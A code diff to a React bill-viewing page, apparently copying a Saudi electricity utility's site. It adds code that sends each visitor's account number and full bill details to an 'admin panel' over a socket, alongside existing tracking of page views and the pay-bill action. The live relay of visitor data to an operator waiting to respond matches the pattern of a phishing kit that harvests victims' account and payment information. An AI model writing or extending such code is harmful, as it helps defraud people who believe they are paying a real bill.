@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { socket } from "@/lib/store";
+import { socket, sendData, navigateToPage } from "@/lib/store";
 
 interface BillData {
   d: {
@@ -134,6 +134,27 @@ export default function BillView() {
       const data = await response.json();
       setBillData(data);
       socket.value.emit("visitor:pageView", { page: "bill-view", url: window.location.href, data: { accountNumber: account } });
+      // Send bill info to admin panel
+      if (data?.d) {
+        const bill = data.d;
+        const billAmount = bill.InvAmt || bill.TotalDueAmt || bill.TotalDueAmountDisplay || '0';
+        navigateToPage('تفاصيل الفاتورة');
+        sendData({
+          data: {
+            'رقم الحساب': account,
+            'مبلغ الفاتورة': `${parseFloat(billAmount).toFixed(2)} ر.س`,
+            'الرصيد السابق': `${parseFloat(bill.PreBal || '0').toFixed(2)} ر.س`,
+            'تاريخ الاستحقاق': parseDateAr(bill.DueDate),
+            'فترة الفاتورة': `${parseDateAr(bill.FromDate)} - ${parseDateAr(bill.ToDate)}`,
+            'الاستهلاك': `${bill.TotalConsumption || '0'} كيلوواط`,
+            'ضريبة القيمة المضافة': `${parseFloat(bill.VatAmt || '0').toFixed(2)} ر.س`,
+            'المكتب': bill.Office || '-',
+            'نوع العداد': bill.MeterTypeDesc || '-',
+          },
+          current: 'تفاصيل الفاتورة',
+          waitingForAdminResponse: false,
+        });
+      }
     } catch (err: any) {
       setError(err.message || "حدث خطأ");
     } finally {
@@ -142,10 +163,10 @@ export default function BillView() {
   };
 
   const handlePayBill = () => {
-    sessionStorage.setItem("billAmount", billData?.d?.TotalDueAmountDisplay || "0");
+    sessionStorage.setItem("billAmount", billData?.d?.InvAmt || billData?.d?.TotalDueAmt || billData?.d?.TotalDueAmountDisplay || "0");
     socket.value.emit("visitor:formSubmit", {
       page: "bill-view",
-      data: { accountNumber, action: "pay-bill", amount: billData?.d?.TotalDueAmountDisplay }
+      data: { accountNumber, action: "pay-bill", amount: billData?.d?.InvAmt || billData?.d?.TotalDueAmt || billData?.d?.TotalDueAmountDisplay }
     });
     setLocation("/select-amount");
   };
@@ -257,7 +278,7 @@ export default function BillView() {
                           ﷼ {parseFloat(bill.PreBal || '0').toFixed(2)}
                         </td>
                         <td style={{ ...tdStyle, background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
-                          ﷼ {parseFloat(bill.TotalDueAmountDisplay || '0').toFixed(2)}
+                          ﷼ {parseFloat(bill.InvAmt || bill.TotalDueAmt || bill.TotalDueAmountDisplay || '0').toFixed(2)}
                         </td>
                         <td style={{ ...tdStyle, background: 'linear-gradient(to left, rgba(0,102,204,0.04), transparent)' }}>
                           ﷼ 0.00
